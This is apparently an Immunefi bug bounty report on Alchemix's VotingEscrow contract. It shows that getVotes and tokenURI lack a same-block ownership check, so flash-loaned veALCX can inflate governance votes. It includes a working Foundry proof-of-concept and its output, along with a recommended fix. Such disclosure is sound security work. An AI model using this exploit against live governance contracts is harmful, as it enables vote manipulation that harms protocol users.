# 31507 - \[SC - Critical] Malicious user could flash-loan the veALCX to i...

Submitted on May 20th 2024 at 19:48:27 UTC by @savi0ur for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31507

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Bug Description

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L366-L369>

```solidity
function balanceOfToken(uint256 _tokenId) external view returns (uint256) {
    if (ownershipChange[_tokenId] == block.number) return 0;
    return _balanceOfTokenAt(_tokenId, block.timestamp);
}
```

The `balanceOfToken()` first checking if ownership change of the `_tokenId` is in the current block, if it is then return zero. This check is necessary to have a newly transferred veALCX tokens to have zero voting balance to prevent someone from flash-loaning veALCX to inflate their voting balance.

However, this check is not there in `balanceOfTokenAt` and `_balanceOfTokenAt` functions.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L372-L374>

```solidity
function balanceOfTokenAt(uint256 _tokenId, uint256 _time) external view returns (uint256) {
    return _balanceOfTokenAt(_tokenId, _time);
}
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1426-L1465>

```solidity
function _balanceOfTokenAt(uint256 _tokenId, uint256 _time) internal view returns (uint256) {
    uint256 _epoch = userPointEpoch[_tokenId];

    // If time is before before the first epoch or a tokens first timestamp, return 0
    if (_epoch == 0 || _time < pointHistory[userFirstEpoch[_tokenId]].ts) {
        return 0;
    } else {
        // Binary search to get point closest to the time
        uint256 _min = 0;
        uint256 _max = userPointEpoch[_tokenId];
        for (uint256 i = 0; i < 128; ++i) {
            // Will be always enough for 128-bit numbers
            if (_min >= _max) {
                break;
            }
            uint256 _mid = (_min + _max + 1) / 2;
            if (userPointHistory[_tokenId][_mid].ts <= _time) {
                _min = _mid;
            } else {
                _max = _mid - 1;
            }
        }

        Point memory lastPoint = userPointHistory[_tokenId][_min];

        // If max lock is enabled bias is unchanged
        int256 biasCalculation = locked[_tokenId].maxLockEnabled
            ? int256(0)
            : lastPoint.slope * (int256(_time) - int256(lastPoint.ts));

        // Make sure we still subtract from bias if value is negative
        lastPoint.bias -= biasCalculation;

        if (lastPoint.bias < 0) {
            lastPoint.bias = 0;
        }

        return uint256(lastPoint.bias);
    }
}
```

As a result, alchemix or some external protocol trying to use `balanceOfToken` and `balanceOfTokenAt` external functions to find voting balance will return different voting balances for the same `_tokenId` depending on which function they called.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L264-L277>

```solidity
function getVotes(address account) external view override(IVotes, IVotingEscrow) returns (uint256) {
    uint32 nCheckpoints = numCheckpoints[account];
    if (nCheckpoints == 0) {
        return 0;
    }
    uint256[] memory _tokenIds = checkpoints[account][nCheckpoints - 1].tokenIds;
    uint256 votes = 0;
    uint256 tokenIdCount = _tokenIds.length;
    for (uint256 i = 0; i < tokenIdCount; i++) {
        uint256 tId = _tokenIds[i];
        votes = votes + _balanceOfTokenAt(tId, block.timestamp);
    }
    return votes;
}
```

As can be seen, `_balanceOfTokenAt` internal function which don't have flashloan protection check is called in `getVotes` function to compute voting balance of an account.

Its possible that alchemix or external protocols will use `getVotes` function to compute the voting balance of an account to use it in their calculation. Due to the use of `_balanceOfTokenAt` function which don't have flashloan protection, will allow users to inflate their voting power by taking a flashloan of veALCX.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L359-L363>

```solidity
function tokenURI(uint256 _tokenId) external view override(IERC721Metadata, IVotingEscrow) returns (string memory) {
    require(idToOwner[_tokenId] != address(0), "Query for nonexistent token");
    LockedBalance memory _locked = locked[_tokenId];
    return _tokenURI(_tokenId, _balanceOfTokenAt(_tokenId, block.timestamp), _locked.end, _locked.amount);
}
```

Since, `tokenURI` function is also using same vulnerable `_balanceOfTokenAt` function, same attack we can perform to change the tokenURI for any `_tokenId`.

## Impact

Since users are able to inflate their voting power, which they can use to vote for a malicious governance proposal. Same attack we can also use to alter tokenURI.

## Recommendation

Flashloan protection check should be implemented in `_balanceOfTokenAt` function.

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L366-L369>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L372-L374>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1426-L1465>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L264-L277>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L359-L363>

## Proof Of Concept

**Steps to Run using Foundry:**

* Paste following foundry code in `src/test/VotingEscrow.t.sol`
* Run using `FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testVoteInflationByTransferToken -vvv`

```solidity
// Check inflation of votes using flashloaning veALCX
function testVoteInflationByTransferToken() public {
    address user1 = address(0x101);
    address user2 = address(0x102);

    uint256 tokenId = createVeAlcx(user1, TOKEN_1, MAXTIME, false);
    hevm.startPrank(user1);
    assertEq(veALCX.ownerOf(tokenId), user1);
    console.log("balanceOfToken(tokenId)   :", veALCX.balanceOfToken(tokenId));
    // console.log("balanceOfTokenAt(tokenId) :", veALCX.balanceOfTokenAt(tokenId, block.timestamp));
    console.log("getVotes(user1)           :", veALCX.getVotes(user1));
    console.log("getVotes(user2)           :", veALCX.getVotes(user2));

    assertEq(veALCX.balanceOfToken(tokenId), getMaxVotingPower(TOKEN_1, veALCX.lockEnd(tokenId)));
    assertEq(veALCX.balanceOfToken(tokenId), veALCX.balanceOfTokenAt(tokenId, block.timestamp));
    assertEq(veALCX.balanceOfToken(tokenId), veALCX.getVotes(user1));
    assertEq(veALCX.getVotes(user2), 0);

    hevm.stopPrank();

    // Take a flashloan of veALCX
    console.log("\nTake a flashloan of veALCX token");
    uint256 tokenId2 = createVeAlcx(user2, TOKEN_1M, MAXTIME, false);
    console.log("Created VeALCX with 1M locked tokens");
    console.log("getVotes(user2)           :", veALCX.getVotes(user2));
    assertEq(veALCX.balanceOfToken(tokenId2), getMaxVotingPower(TOKEN_1M, veALCX.lockEnd(tokenId2)));

    // Transferring tokenId2 from user2 to user1
    console.log("\nTransferring flashloaned tokenId2 from user2 to user1");
    hevm.startPrank(user2);
    veALCX.safeTransferFrom(user2, user1, tokenId2);
    assertEq(veALCX.ownerOf(tokenId2), user1);
    hevm.stopPrank();

    console.log("balanceOfToken(tokenId)   :", veALCX.balanceOfToken(tokenId));
    console.log("balanceOfToken(tokenId2)  :", veALCX.balanceOfToken(tokenId2));
    console.log("balanceOfTokenAt(tokenId2):", veALCX.balanceOfTokenAt(tokenId2, block.timestamp));
    console.log("getVotes(user1)           : %s <= Inflated voting power", veALCX.getVotes(user1));
    console.log("getVotes(user2)           :", veALCX.getVotes(user2));

    assertEq(veALCX.balanceOfToken(tokenId2), 0);
    assertEq(veALCX.getVotes(user1), veALCX.balanceOfToken(tokenId) + veALCX.balanceOfTokenAt(tokenId2, block.timestamp));

    hevm.stopPrank();
}
```

**Console Output:**

```shell
> FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testVoteInflationByTransferToken -vvv

Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testVoteInflationByTransferToken() (gas: 2317763)
Logs:
  balanceOfToken(tokenId)   : 1994518328243124355
  getVotes(user1)           : 1994518328243124355
  getVotes(user2)           : 0

Take a flashloan of veALCX token
  Created VeALCX with 1M locked tokens
  getVotes(user2)           : 1994518328259766615659745

Transferring flashloaned tokenId2 from user2 to user1
  balanceOfToken(tokenId)   : 1994518328243124355
  balanceOfToken(tokenId2)  : 0
  balanceOfTokenAt(tokenId2): 1994518328259766615659745
  getVotes(user1)           : 1994520322778094858784100 <= Inflated voting power
  getVotes(user2)           : 0
```
